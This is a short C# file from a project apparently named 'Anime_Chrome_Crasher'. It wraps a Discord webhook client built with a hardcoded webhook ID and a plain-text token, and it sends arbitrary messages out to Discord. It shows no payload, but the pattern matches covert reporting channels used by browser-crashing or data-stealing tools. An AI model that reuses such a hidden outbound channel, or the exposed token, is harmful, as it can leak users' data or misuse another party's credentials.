using Discord.Webhook;

namespace Anime_Chrome_Crasher
{
    class WeebHook
    {
        public static void SendMessage(string message)
        {
            DiscordWebhookClient discord = new DiscordWebhookClient(535418425393020939, "13xLgUxSCQa4LuNw7q40FDf21CYSVmHhwuHIhAolxHnljnWOP9Jb7emR1pcwMq55RlGl");
            discord.SendMessageAsync(message);
        }
    }
}